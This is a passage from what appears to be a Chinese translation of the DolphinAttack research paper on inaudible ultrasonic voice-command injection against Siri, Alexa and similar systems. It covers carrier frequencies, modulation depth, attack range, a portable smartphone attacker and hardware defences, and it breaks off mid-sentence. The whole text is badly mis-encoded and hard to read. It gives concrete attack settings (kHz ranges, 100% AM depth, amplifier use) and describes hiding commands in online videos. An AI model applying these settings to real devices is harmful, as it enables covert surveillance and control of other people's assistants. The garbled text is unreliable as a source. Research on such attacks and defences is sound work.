ä¾‹å¦‚ï¼Œâ€œå‘¼å«/ FaceTime 1234567890â€å’Œâ€œæ‰“å¼€dolphinattack.comâ€æ¯”â€œæ‰“å¼€é£æœºæ¨¡å¼â€æˆ–â€œä»Šå¤©çš„å¤©æ°”å¦‚ä½•â€æ›´éš¾è¢«è¯†åˆ«ã€‚ åœ¨å‰ä¸€ç§æƒ…å†µä¸‹ï¼Œå¿…é¡»æ­£ç¡®è¯†åˆ«æ‰§è¡Œå­—â€œ callâ€ï¼Œâ€œ openâ€å’Œå†…å®¹ï¼ˆæ•°å­—ï¼Œurlï¼‰ã€‚ ä½†æ˜¯ï¼Œå¯¹äºåä¸€ç§æƒ…å†µï¼Œä»…è¯†åˆ«è¯¸å¦‚â€œé£æœºâ€å’Œâ€œå¤©æ°”â€ä¹‹ç±»çš„å…³é”®å­—å°±è¶³ä»¥æ‰§è¡ŒåŸå§‹å‘½ä»¤ã€‚ å¦‚æœæ”»å‡»å‘½ä»¤ç®€çŸ­ä¸”å¯¹äºSRç³»ç»Ÿé€šç”¨ï¼Œåˆ™å¯ä»¥æé«˜æ”»å‡»æ€§èƒ½ã€‚è½½æ³¢é¢‘ç‡ï¼š fcæ˜¯å½±å“æ”»å‡»æˆåŠŸç‡çš„ä¸»è¦å› ç´ ï¼Œå¹¶ä¸”åœ¨å„ä¸ªè®¾å¤‡ä¹‹é—´ä¹Ÿæ˜¾ç¤ºå‡ºå¾ˆå¤§çš„å·®å¼‚ã€‚å¯¹äºæŸäº›è®¾å¤‡ï¼ŒæˆåŠŸè¿›è¡Œè¯†åˆ«æ”»å‡»çš„fcèŒƒå›´å¯ä»¥å®½è‡³20-42 kHzï¼ˆä¾‹å¦‚iPhone 4sï¼‰ï¼Œä¹Ÿå¯ä»¥çª„è‡³å‡ ä¸ªå•ä¸ªé¢‘ç‡ç‚¹ï¼ˆä¾‹å¦‚iPhone 5sï¼‰ã€‚æˆ‘ä»¬å°†è¿™ç§å¤šæ ·æ€§å½’å› äºè¿™äº›éº¦å…‹é£çš„é¢‘ç‡å“åº”å’Œé¢‘ç‡é€‰æ‹©æ€§çš„å·®å¼‚ä»¥åŠéŸ³é¢‘å¤„ç†ç”µè·¯çš„éçº¿æ€§ã€‚ä¾‹å¦‚ï¼ŒNexus 7çš„fcèŒƒå›´æ˜¯ä»24åˆ°39 kHzï¼Œè¿™å¯ä»¥ä»ä¸¤ä¸ªæ–¹é¢è¿›è¡Œè§£é‡Šã€‚ fcä¸é«˜äº39 kHzï¼Œå› ä¸ºVifaæ‰¬å£°å™¨åœ¨39 kHzä»¥ä¸Šçš„é¢‘ç‡å“åº”è¾ƒä½ï¼Œè€ŒNexus 7éº¦å…‹é£ä¹‹ä¸€ä¹Ÿè¾ƒä½ã€‚å› æ­¤ï¼Œç»“åˆèµ·æ¥ï¼Œé«˜äº39 kHzçš„è½½æ³¢ä¸å†è¶³å¤Ÿæœ‰æ•ˆä»¥æ³¨å…¥å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ã€‚ç”±äºéº¦å…‹é£é¢‘ç‡å“åº”çš„éçº¿æ€§ï¼Œfcä¸èƒ½å°äº24 kHzã€‚æˆ‘ä»¬è§‚å¯Ÿåˆ°ï¼Œå½“åŸºå¸¦è°æ³¢çš„å¹…åº¦å¤§äºåŸºå¸¦ä¹‹ä¸€æ—¶ï¼Œæ— æ³•å¬åˆ°çš„è¯­éŸ³å‘½ä»¤å¯¹äºSRç³»ç»Ÿå˜å¾—ä¸å¯æ¥å—ã€‚ä¾‹å¦‚ï¼Œåœ¨ç»™å®š400 HzéŸ³è°ƒçš„åŸºå¸¦çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æµ‹é‡Nexus 7ä¸Šçš„è§£è°ƒä¿¡å·ï¼ˆå³400 HzåŸºå¸¦ï¼‰ï¼Œå¹¶è§‚å¯Ÿ800 Hzï¼ˆ2æ¬¡è°æ³¢ï¼‰ï¼Œ1200 Hzï¼ˆ3æ¬¡è°æ³¢ï¼‰ç”šè‡³æ›´é«˜çš„è°æ³¢ï¼Œè¿™å¯èƒ½æ˜¯ç”±äºéŸ³é¢‘å¤„ç†ç”µè·¯çš„éçº¿æ€§æ‰€è‡´ã€‚å¦‚å›¾12æ‰€ç¤ºï¼Œå½“fcå°äº23 kHzæ—¶ï¼Œç¬¬äºŒå’Œç¬¬ä¸‰è°æ³¢è¦å¼ºäºç¬¬ä¸€è°æ³¢ï¼Œè¿™ä¼šä½¿åŸºå¸¦ä¿¡å·å¤±çœŸå¹¶ä½¿SRç³»ç»Ÿéš¾ä»¥è¯†åˆ«ã€‚å¯¼è‡´æœ€ä½³æ”»å‡»æ€§èƒ½çš„Prime fcæ˜¯æ—¢æ˜¾ç¤ºé«˜åŸºå¸¦ä¿¡å·åˆæ˜¾ç¤ºä½è°æ³¢çš„é¢‘ç‡ã€‚åœ¨Nexus 7ä¸Šï¼ŒPrime fcä¸º24.1 kHzè°ƒåˆ¶æ·±åº¦ï¼š è°ƒåˆ¶æ·±åº¦ä¼šå½±å“è§£è°ƒåçš„åŸºå¸¦ä¿¡å·çš„å¹…åº¦åŠå…¶è°æ³¢ï¼Œå¦‚å›¾13æ‰€ç¤ºã€‚éšç€è°ƒåˆ¶æ·±åº¦ä»0ï¼…é€æ¸å¢åŠ åˆ°100ï¼…ï¼Œè§£è°ƒåçš„ä¿¡å·ä¼šå˜å¾—æ›´å¼ºï¼Œè¿›è€Œæé«˜SNRå’Œæ”»å‡»æˆåŠŸç‡ï¼Œ é™¤å°‘æ•°ä¾‹å¤–ï¼ˆä¾‹å¦‚ï¼Œå½“è°æ³¢ä½¿åŸºå¸¦ä¿¡å·å¤±çœŸçš„ç¨‹åº¦å¤§äºAMæ·±åº¦è¾ƒä½çš„æƒ…å†µæ—¶ï¼‰ã€‚ æˆ‘ä»¬åœ¨Tab 3 ä¸­æŠ¥å‘Šäº†å¯¹æ¯å°è®¾å¤‡æˆåŠŸè¿›è¡Œè¯†åˆ«æ”»å‡»çš„æœ€å°æ·±åº¦ã€‚æ”»å‡»è·ç¦»ï¼š æ”»å‡»è·ç¦»ä»2å˜ç±³åˆ°æœ€å¤§175å˜ç±³ä¸ç­‰ï¼Œå¹¶ä¸”è·¨è®¾å¤‡å·®å¼‚å¾ˆå¤§ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨Amazon Echoä¸Šä¸¤æ¬¡æ”»å‡»éƒ½å¯ä»¥è¾¾åˆ°çš„æœ€å¤§è·ç¦»ä¸º165å˜ç±³ã€‚ æˆ‘ä»¬è®¤ä¸ºï¼Œå¯ä»¥ä½¿ç”¨å¯ä»¥äº§ç”Ÿæ›´é«˜å‹åŠ›æ°´å¹³çš„å£°éŸ³å¹¶è¡¨ç°å‡ºæ›´å¥½çš„å£°éŸ³æŒ‡å‘æ€§çš„è®¾å¤‡æ¥å¢åŠ è·ç¦»ï¼Œæˆ–è€…ä½¿ç”¨æ›´çŸ­å’Œæ›´æ˜“äºè¯†åˆ«çš„å‘½ä»¤æ¥å¢åŠ è·ç¦»ã€‚åŠªåŠ›ä¸æŒ‘æˆ˜ï¼šåœ¨è¿›è¡Œä¸Šè¿°å®éªŒæ—¶ï¼Œæˆ‘ä»¬é¢ä¸´æŒ‘æˆ˜ã€‚ é™¤äº†è·å–è®¾å¤‡ä»¥å¤–ï¼Œç”±äºç¼ºå°‘éŸ³é¢‘æµ‹é‡åé¦ˆç•Œé¢ï¼Œå› æ­¤æµ‹é‡æ¯ä¸ªå‚æ•°éå¸¸è€—æ—¶ä¸”è´¹åŠ›ã€‚ ä¾‹å¦‚ï¼Œä¸ºæµ‹é‡Prime fcï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸åŒå¹³å°ä¸Šçš„éŸ³é¢‘é¢‘è°±åˆ†æè½¯ä»¶åœ¨å„ç§è®¾å¤‡ä¸Šåˆ†æè§£è°ƒç»“æœï¼šiOS [30]ï¼ŒmacOS [34]ï¼ŒAndroid [41]å’ŒWindows [35]ã€‚ å¯¹äºä¸æ”¯æŒå®‰è£…é¢‘è°±è½¯ä»¶çš„è®¾å¤‡ï¼ˆä¾‹å¦‚Apple Watchå’ŒAmazon Echoï¼‰ï¼Œæˆ‘ä»¬åˆ©ç”¨å‘¼å«å’Œå‘½ä»¤æ—¥å¿—å›æ”¾åŠŸèƒ½ï¼Œå¹¶åœ¨å¦ä¸€å°ä¸­ç»§è®¾å¤‡ä¸Šæµ‹é‡éŸ³é¢‘ã€‚ 5.4 å°ç»“æˆ‘ä»¬å°†å®éªŒæ€»ç»“å¦‚ä¸‹ã€‚ ï¼ˆ1ï¼‰æˆ‘ä»¬éªŒè¯äº†è·¨è¶Š16ç§ä¸åŒè®¾å¤‡å’Œ7ç§è¯­éŸ³è¯†åˆ«ç³»ç»Ÿçš„è¯†åˆ«å’Œæ¿€æ´»æ”»å‡»ï¼Œå¹¶åœ¨å‡ ä¹æ‰€æœ‰è®¾å¤‡ä¸Šå‡è·å¾—äº†æˆåŠŸã€‚ ï¼ˆ2ï¼‰æˆ‘ä»¬æµ‹é‡äº†æ‰€æœ‰è®¾å¤‡çš„æ”»å‡»æ€§èƒ½ï¼Œå…¶ä¸­ä¸€äº›è®¾å¤‡è¶³ä»¥åº”ä»˜æ—¥å¸¸æƒ…å†µä¸‹çš„å®é™…æ”»å‡»ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è·ç¦»iPhone 2så’ŒAmazon Echoçº¦2ç±³çš„åœ°æ–¹å¯åŠ¨DolphinAttackã€‚ ï¼ˆ3ï¼‰æˆ‘ä»¬æµ‹é‡ï¼Œæ£€æŸ¥å¹¶è®¨è®ºäº†ä¸æ”»å‡»æ€§èƒ½æœ‰å…³çš„å‚æ•°ï¼ŒåŒ…æ‹¬SRç³»ç»Ÿï¼Œè®¾å¤‡ç¡¬ä»¶ï¼Œè¯­éŸ³å‘½ä»¤ï¼Œfcï¼ŒAMæ·±åº¦ç­‰ã€‚ 6 å½±å“å®šé‡åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åŠŸèƒ½å¼ºå¤§çš„å‘å°„å™¨ï¼ˆå³ï¼Œå›¾5ä¸­æ‰€ç¤ºçš„å°å¼æœºè®¾ç½®ï¼‰ï¼Œæ ¹æ®è¯­è¨€ï¼ŒèƒŒæ™¯å™ªå£°ï¼Œå£°å‹çº§å’Œæ”»å‡»è·ç¦»è¯„ä¼°DolphinAttackçš„æ€§èƒ½ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬è¯„ä¼°äº†ä½¿ç”¨ä¾¿æºå¼è®¾å¤‡è¿›è¡Œçš„æ¼«æ¸¸æ”»å‡»çš„æœ‰æ•ˆæ€§ã€‚ 6.1 è¯­è¨€çš„å½±å“ä¸ºäº†æ£€æŸ¥DolphinAttackåœ¨è¯­è¨€æ–¹é¢çš„æœ‰æ•ˆæ€§ï¼Œæˆ‘ä»¬é€‰æ‹©äº†äº”ç§è¯­è¨€ä¸­çš„ä¸‰ä¸ªè¯­éŸ³å‘½ä»¤ã€‚è¯­éŸ³å‘½ä»¤åŒ…æ‹¬æ¿€æ´»å‘½ä»¤ï¼ˆâ€œ Hey Siriâ€ï¼‰å’Œä¸¤ä¸ªæ§åˆ¶å‘½ä»¤ï¼ˆâ€œ Call 1234567890â€å’Œâ€œ Turn onplane modeâ€ï¼‰ï¼Œä»£è¡¨é’ˆå¯¹SRç³»ç»Ÿçš„ä¸‰ç§æ”»å‡»ï¼šæ¿€æ´»SRç³»ç»Ÿï¼Œå¯åŠ¨å¯¹ç”¨æˆ·çš„ç›‘è§†ï¼Œå’Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ¯ä¸ªè¯­éŸ³å‘½ä»¤åˆ†åˆ«ä»¥è‹±è¯­ï¼Œä¸­æ–‡ï¼Œå¾·è¯­ï¼Œæ³•è¯­å’Œè¥¿ç­ç‰™è¯­è¿›è¡Œæµ‹è¯•ã€‚æˆ‘ä»¬é’ˆå¯¹ä¸è¿è¡ŒiOS 10.3.1çš„iPhone 6 Plusé…å¯¹çš„Apple Watchæ¨å‡ºDolphinAttackã€‚å¯¹äºæ¯ç§è¯­è¨€çš„æ¯ç§è¯­éŸ³å‘½ä»¤ï¼Œæˆ‘ä»¬å°†å…¶é‡å¤10æ¬¡å¹¶è®¡ç®—å¹³å‡æˆåŠŸç‡ã€‚è·ç¦»è®¾ç½®ä¸º20 cmï¼Œæµ‹å¾—çš„èƒŒæ™¯å™ªå£°ä¸º55 dBã€‚æˆ‘ä»¬åˆ©ç”¨25 kHzè½½æ³¢é¢‘ç‡å’Œ100ï¼…AMæ·±åº¦ã€‚å›¾14ç¤ºå‡ºäº†ç»™å®šè¯­è¨€çš„ä¸‰ä¸ªè¯­éŸ³å‘½ä»¤çš„è¯†åˆ«ç»“æœã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå„ç§è¯­è¨€å’Œè¯­éŸ³å‘½ä»¤çš„è¯†åˆ«ç‡å‡ ä¹ç›¸åŒã€‚ç‰¹åˆ«åœ°ï¼Œè‹±è¯­å’Œè¥¿ç­ç‰™è¯­ä¸­æ‰€æœ‰è¯­éŸ³å‘½ä»¤çš„è¯†åˆ«ç‡å‡ä¸º100ï¼…ï¼Œå¹¶ä¸”ä¸‰ç§è¯­éŸ³å‘½ä»¤åœ¨æ‰€æœ‰è¯­è¨€ä¸­çš„å¹³å‡è¯†åˆ«ç‡åˆ†åˆ«ä¸º100ï¼…ï¼Œ96ï¼…å’Œ98ï¼…ã€‚æ­¤å¤–ï¼Œç”¨äºæ¿€æ´»çš„è¯†åˆ«ç‡ï¼ˆå³ï¼Œâ€œå˜¿Siriâ€ï¼‰é«˜äºæ§åˆ¶å‘½ä»¤â€œå‘¼å«1234567890â€å’Œâ€œæ‰“å¼€é£æœºæ¨¡å¼â€ä¹‹ä¸€ã€‚è¿™æ˜¯å› ä¸ºæ¿€æ´»å‘½ä»¤çš„é•¿åº¦æ¯”æ§åˆ¶å‘½ä»¤çš„é•¿åº¦çŸ­ã€‚æ— è®ºå¦‚ä½•ï¼Œç»“æœè¡¨æ˜æˆ‘ä»¬çš„æ–¹æ³•å¯¹äºå„ç§è¯­è¨€å’Œè¯­éŸ³å‘½ä»¤éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚ 6.2 èƒŒæ™¯å™ªå£°çš„å½±å“ä¼—æ‰€å‘¨çŸ¥ï¼Œè¯­éŸ³è¯†åˆ«å¯¹èƒŒæ™¯å™ªå£°æ•æ„Ÿï¼Œå»ºè®®åœ¨å®‰é™çš„ç¯å¢ƒä¸­ä½¿ç”¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¸‹æ£€æŸ¥äº†é€šè¿‡DolphinAttackå‘å‡ºçš„å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤æ³¨å…¥ï¼šåœ¨åŠå…¬å®¤ï¼Œå’–å•¡é¦†ï¼Œåœ¨è¡—ä¸Šã€‚ä¸ºç¡®ä¿å®éªŒå¯é‡å¤ï¼Œæˆ‘ä»¬é€šè¿‡ä»¥é€‰å®šçš„SPLæ’­æ”¾èƒŒæ™¯å£°éŸ³æ¥æ¨¡æ‹Ÿè¿™ä¸‰ç§æƒ…å†µï¼Œå¹¶è¯„ä¼°å®ƒä»¬å¯¹è¯†åˆ«ç‡çš„å½±å“ã€‚æˆ‘ä»¬é€‰æ‹©Apple Watchä½œä¸ºæ”»å‡»ç›®æ ‡ï¼Œå¹¶é€šè¿‡è¿·ä½ å£°çº§è®¡æµ‹é‡èƒŒæ™¯å™ªéŸ³ã€‚ä»è¡¨4å¯ä»¥çœ‹å‡ºï¼Œæ¿€æ´»å‘½ä»¤çš„è¯†åˆ«ç‡åœ¨æ‰€æœ‰ä¸‰ä¸ªåœºæ™¯ä¸­å‡è¶…è¿‡90ï¼…ï¼Œè€Œæ§åˆ¶å‘½ä»¤ï¼ˆâ€œé£æœºé£è¡Œæ¨¡å¼â€ï¼‰çš„è¯†åˆ«ç‡åˆ™éšç€ç¯å¢ƒå™ªå£°æ°´å¹³çš„æé«˜è€Œé™ä½ã€‚è¿™æ˜¯å› ä¸ºæ¿€æ´»å‘½ä»¤æ¯”æ§åˆ¶å‘½ä»¤çŸ­ã€‚éšç€æ§åˆ¶å‘½ä»¤çš„å•è¯æ•°å¢åŠ ï¼Œç”±äºæ— æ³•è¯†åˆ«ä»»ä½•å•è¯å¯èƒ½å¯¼è‡´å‘½ä»¤è¯†åˆ«å¤±è´¥ï¼Œå› æ­¤è¯†åˆ«ç‡è¿…é€Ÿä¸‹é™ã€‚ 6.3 å£°å‹çº§çš„å½±å“å¯¹äºå¯å¬å’Œä¸å¯å¬çš„å£°éŸ³ï¼Œè¾ƒé«˜çš„SPLä¼šå¯¼è‡´å½•åˆ¶çš„è¯­éŸ³è´¨é‡æ›´é«˜ï¼Œä»è€Œè¯†åˆ«ç‡ä¹Ÿæ›´é«˜ã€‚è¿™æ˜¯å› ä¸ºå¯¹äºç»™å®šçš„å™ªå£°æ°´å¹³ï¼Œè¾ƒé«˜çš„SPLå§‹ç»ˆæ„å‘³ç€è¾ƒå¤§çš„ä¿¡å™ªæ¯”ï¼ˆSNRï¼‰ã€‚ä¸ºäº†æ¢ç´¢SPLå¯¹DolphinAttackçš„å½±å“ï¼Œæˆ‘ä»¬åœ¨Apple Watchå’ŒGalaxy S6 Edgeæ™ºèƒ½æ‰‹æœºä¸Šæµ‹è¯•äº†æ§åˆ¶å‘½ä»¤ï¼ˆâ€œ Call 1234567890â€ï¼‰ã€‚åœ¨æ‰€æœ‰å®éªŒä¸­ï¼Œå°†æ‰¬å£°å™¨æ”¾ç½®åœ¨è·ç›®æ ‡è®¾å¤‡10å˜ç±³çš„ä½ç½®ï¼Œå¹¶å°†è¿·ä½ å£°çº§è®¡æ”¾ç½®åœ¨æ‰¬å£°å™¨æ—è¾¹ä»¥æµ‹é‡ç¯å¢ƒå™ªå£°ã€‚æˆ‘ä»¬ç”¨ä¸¤ç§ç²’åº¦æ¥é‡åŒ–SPLçš„å½±å“ï¼šå¥å­è¯†åˆ«ç‡å’Œå•è¯è¯†åˆ«ç‡ã€‚å¥å­è¯†åˆ«ç‡è®¡ç®—æˆåŠŸè¯†åˆ«çš„å‘½ä»¤çš„ç™¾åˆ†æ¯”ã€‚åªæœ‰æ­£ç¡®è¯†åˆ«äº†å‘½ä»¤ä¸­çš„æ¯ä¸ªå•è¯ï¼Œæ‰è®¤ä¸ºå‘½ä»¤å·²è¢«è¯†åˆ«ã€‚å•è¯è¯†åˆ«ç‡æ˜¯æ­£ç¡®è§£é‡Šçš„å•è¯çš„ç™¾åˆ†æ¯”ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå‘½ä»¤â€œ call 1234567890â€è¢«è¯†åˆ«ä¸ºâ€œ call 1234567â€ï¼Œåˆ™å•è¯è¯†åˆ«ç‡ä¸º63.6ï¼…ï¼ˆ7/11ï¼‰ã€‚å›¾15ï¼ˆaï¼‰ï¼ˆbï¼‰æ˜¾ç¤ºäº†SPLå¯¹ä¸¤ç§è¯†åˆ«ç‡çš„å½±å“ã€‚æ¯«ä¸å¥‡æ€ªï¼Œç»™å®šç›¸åŒçš„SPLï¼Œå•è¯è¯†åˆ«ç‡å§‹ç»ˆå¤§äºå¥å­è¯†åˆ«ç‡ï¼Œç›´åˆ°ä¸¤è€…éƒ½è¾¾åˆ°100ï¼…ã€‚å¯¹äºApple Watchï¼Œä¸€æ—¦SPLå¤§äº106.2 dBï¼Œä¸¤ç§è¯†åˆ«ç‡éƒ½å°†å˜ä¸º100ï¼…ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒGalaxy S6 Edgeè¾¾åˆ°100ï¼…è¯†åˆ«ç‡çš„æœ€ä½SPLä¸º113.96 dBï¼Œé«˜äºApple Watchçš„æœ€ä½å£°å‹çº§ã€‚è¿™æ˜¯å› ä¸ºåœ¨è§£è°ƒå¬ä¸è§çš„è¯­éŸ³å‘½ä»¤æ–¹é¢ï¼ŒApple Watchèƒœè¿‡Galaxy S6 Edgeã€‚ 6.4 æ”»å‡»è·ç¦»çš„å½±å“åœ¨æœ¬èŠ‚ä¸­ï¼Œå°†ä½¿ç”¨æ¿€æ´»å‘½ä»¤ï¼ˆâ€œ Hey Siriâ€æˆ–â€œ Hi Galaxyâ€ï¼‰å’Œæ§åˆ¶å‘½ä»¤ï¼ˆâ€œ Call 1234567890â€ï¼‰æ¥æµ‹è¯•å„ç§è·ç¦»ä¸‹çš„è¯†åˆ«ç‡ã€‚ æˆ‘ä»¬è¯„ä¼°äº†Apple Watchå’ŒGalaxy S6 Edgeä¸Šä¸¤ä¸ªå‘½ä»¤çš„è¯†åˆ«ç‡ï¼Œå¹¶åœ¨å›¾16ä¸­è¿›è¡Œäº†æè¿°ã€‚é€šå¸¸ï¼Œæ¿€æ´»å‘½ä»¤çš„è¯†åˆ«ç‡é«˜äºæ§åˆ¶å‘½ä»¤çš„è¯†åˆ«ç‡ï¼Œå› ä¸ºæ¿€æ´» è¯¥å‘½ä»¤åŒ…å«çš„å•è¯æ•°å°‘äºæ§åˆ¶å‘½ä»¤ã€‚ å¯ä»¥åœ¨100å˜ç±³è¿œçš„åœ°æ–¹ä»¥100ï¼…çš„æˆåŠŸç‡æ¿€æ´»Apple Watchï¼Œä»25å˜ç±³å¤„ä»¥100ï¼…çš„æˆåŠŸç‡æ¿€æ´»Galaxy S6 Edgeã€‚ æˆ‘ä»¬è®¤ä¸ºï¼Œè¿™ä¸¤ç§è®¾å¤‡ä¹‹é—´çš„å·®å¼‚æ˜¯å› ä¸ºApple Watchæˆ´åœ¨æ‰‹è…•ä¸Šï¼Œå¹¶ä¸”å¯ä»¥æ¥å—æ¯”æ™ºèƒ½æ‰‹æœºæ›´é•¿çš„è¯­éŸ³å‘½ä»¤ã€‚ 6.5 ä¾¿æºå¼è®¾å¤‡æ”»å‡»è¯„ä¼°åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬è¯„ä¼°ä¾¿æºå¼è®¾å¤‡æ”»å‡»çš„æœ‰æ•ˆæ€§ã€‚è®¾å®šã€‚æˆ‘ä»¬å°†è¿è¡ŒAndroid 6.0.1çš„Galaxy S6 Edgeæ™ºèƒ½æ‰‹æœºç”¨ä½œæ”»å‡»è®¾å¤‡ï¼Œå°†Apple Watchä½œä¸ºå—å®³è€…è®¾å¤‡ï¼Œå¹¶å°†å…¶ä¸iPhone 6 Plusé…å¯¹ä½¿ç”¨ã€‚æ”»å‡»å£°éŸ³å‘½ä»¤æ˜¯â€œæ‰“å¼€é£è¡Œæ¨¡å¼â€ã€‚æˆ‘ä»¬å°†fcåˆ†åˆ«è®¾ç½®ä¸º{20ã€21ã€22ã€23ã€24} kHzã€‚ AMæ·±åº¦ä¸º100ï¼…ï¼Œé‡‡æ ·ç‡ä¸º192 kHzã€‚åŸºå¸¦ä¿¡å·çš„æœ€å¤§é¢‘ç‡ä¸º3 kHzã€‚ç»“æœï¼Œå¦‚è¡¨5æ‰€ç¤ºï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨Apple Watchä¸Šä»¥23 kHzè½½æ³¢é¢‘ç‡â€œå¼€å¯äº†é£è¡Œæ¨¡å¼â€ã€‚è¯·æ³¨æ„ï¼Œ20 kHzå’Œ21 kHzä¹ŸæˆåŠŸã€‚ä½†æ˜¯ï¼Œé¢‘ç‡æ³„æ¼ä½äº20 kHzï¼Œå¬èµ·æ¥åƒï¼Œå¯ä»¥å¬åˆ°ã€‚å•è¯å’Œå¥å­çš„è¯†åˆ«ç‡æ˜¯100ï¼…ã€‚éšç€fcçš„å¢åŠ ï¼Œç”±äºæ‰¬å£°å™¨çš„é¢‘ç‡é€‰æ‹©æ€§ï¼ŒApple Watchæ— æ³•è¯†åˆ«è¯­éŸ³å‘½ä»¤ã€‚ä¸ºäº†æ‰©å±•æ”»å‡»è·ç¦»ï¼Œæˆ‘ä»¬åˆ©ç”¨ä½åŠŸç‡éŸ³é¢‘æ”¾å¤§å™¨ï¼ˆ3ç“¦ï¼‰æ¨¡å—æ¥é©±åŠ¨è¶…å£°æ¢èƒ½å™¨ï¼Œå¦‚å›¾11æ‰€ç¤ºã€‚ä½¿ç”¨æ”¾å¤§å™¨æ¨¡å—ï¼Œæœ‰æ•ˆæ”»å‡»çš„æœ€å¤§è·ç¦»å¢åŠ åˆ°27å˜ç±³ã€‚è¯·æ³¨æ„ï¼Œä½¿ç”¨ä¸“ä¸šè®¾å¤‡å’ŒåŠŸèƒ½æ›´å¼ºå¤§çš„æ”¾å¤§å™¨å¯ä»¥è¿›ä¸€æ­¥æ‰©å¤§æ”»å‡»è·ç¦»ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å—å®³è€…çš„è®¾å¤‡å‘èµ·è¿œç¨‹æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œå¯¹æ‰‹å¯ä»¥ä¸Šä¼ éŸ³é¢‘æˆ–è§†é¢‘å‰ªè¾‘ï¼Œå…¶ä¸­è¯­éŸ³å‘½ä»¤åµŒå…¥åœ¨ç½‘ç«™ä¸­ï¼Œä¾‹å¦‚YouTubeã€‚å½“å—å®³è€…çš„è®¾å¤‡æ’­æ”¾éŸ³é¢‘æˆ–è§†é¢‘æ—¶ï¼Œå¯èƒ½ä¼šæ— æ„è¯†åœ°è§¦å‘å‘¨å›´çš„è¯­éŸ³å¯æ§ç³»ç»Ÿï¼Œä¾‹å¦‚Google Home Assistantï¼ŒAlexaå’Œæ‰‹æœºã€‚ 7 é˜²å¾¡åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»ç¡¬ä»¶å’Œè½¯ä»¶è§’åº¦è®¨è®ºé’ˆå¯¹ä¸Šè¿°æ”»å‡»çš„é˜²å¾¡ç­–ç•¥ã€‚ 7.1 åŸºäºç¡¬ä»¶çš„é˜²å¾¡æˆ‘ä»¬æå‡ºäº†ä¸¤ç§åŸºäºç¡¬ä»¶çš„é˜²å¾¡ç­–ç•¥ï¼šéº¦å…‹é£å¢å¼ºå’ŒåŸºå¸¦æ¶ˆé™¤ã€‚ éº¦å…‹é£å¢å¼ºï¼šè¯­éŸ³å‘½ä»¤å¬ä¸åˆ°çš„æ ¹æœ¬åŸå› æ˜¯ï¼Œéº¦å…‹é£å¯ä»¥æ„Ÿåº”åˆ°é«˜äº20 kHzçš„é¢‘ç‡çš„å£°éŸ³ï¼Œè€Œç†æƒ³çš„éº¦å…‹é£åˆ™ä¸èƒ½ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä»Šç§»åŠ¨è®¾å¤‡ä¸Šçš„å¤§å¤šæ•°MEMSéº¦å…‹é£éƒ½å…è®¸20 kHzä»¥ä¸Šçš„ä¿¡å·[2ã€3ã€29ã€52ã€53]ã€‚å› æ­¤ï¼Œåº”å¢å¼ºéº¦å…‹é£å¹¶è®¾è®¡å…¶æŠ‘åˆ¶ä»»ä½•é¢‘ç‡åœ¨è¶…å£°èŒƒå›´å†…çš„å£°éŸ³ä¿¡å·ã€‚ä¾‹å¦‚ï¼ŒiPhone 6 Plusçš„éº¦å…‹é£å¯ä»¥å¾ˆå¥½åœ°æŠµæŠ—å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ã€‚ è¯­éŸ³å‘½ä»¤å–æ¶ˆå¬ä¸è§ã€‚åœ¨ä½¿ç”¨ä¼ ç»Ÿéº¦å…‹é£çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨LPFä¹‹å‰æ·»åŠ ä¸€ä¸ªæ¨¡å—ï¼Œä»¥æ£€æµ‹è°ƒåˆ¶åçš„è¯­éŸ³å‘½ä»¤å¹¶ä½¿ç”¨è°ƒåˆ¶åçš„è¯­éŸ³å‘½ä»¤å–æ¶ˆåŸºå¸¦ã€‚ç‰¹åˆ«æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹åˆ°å…·æœ‰AMè°ƒåˆ¶ç‰¹æ€§çš„è¶…å£°é¢‘ç‡èŒƒå›´å†…çš„ä¿¡å·ï¼Œå¹¶å¯¹ä¿¡å·è¿›è¡Œè§£è°ƒä»¥è·å¾—åŸºå¸¦ã€‚ä¾‹å¦‚ï¼Œåœ¨å­˜åœ¨ä¸å¯å¬è§çš„è¯­éŸ³å‘½ä»¤æ³¨å…¥çš„æƒ…å†µä¸‹ï¼Œé™¤äº†å·²è§£è°ƒçš„åŸºå¸¦ä¿¡å·mï¼ˆtï¼‰ä¹‹å¤–ï¼Œè®°å½•çš„æ¨¡æ‹Ÿè¯­éŸ³ä¿¡å·è¿˜åº”åŒ…æ‹¬åŸå§‹è°ƒåˆ¶ä¿¡å·ï¼švï¼ˆtï¼‰= Amï¼ˆtï¼‰cosï¼ˆ2Ï€fc tï¼‰+ cosï¼ˆ2Ï€fc tï¼‰ï¼Œå…¶ä¸­Aæ˜¯è¾“å…¥ä¿¡å·mï¼ˆtï¼‰çš„å¢ç›Šã€‚é€šè¿‡ä¸‹å˜é¢‘vï¼ˆtï¼‰ä»¥è·å¾—Amï¼ˆtï¼‰å¹¶è°ƒæ•´å¹…åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å‡å»åŸºå¸¦ä¿¡å·ã€‚è¯·æ³¨æ„ï¼Œè¿™æ 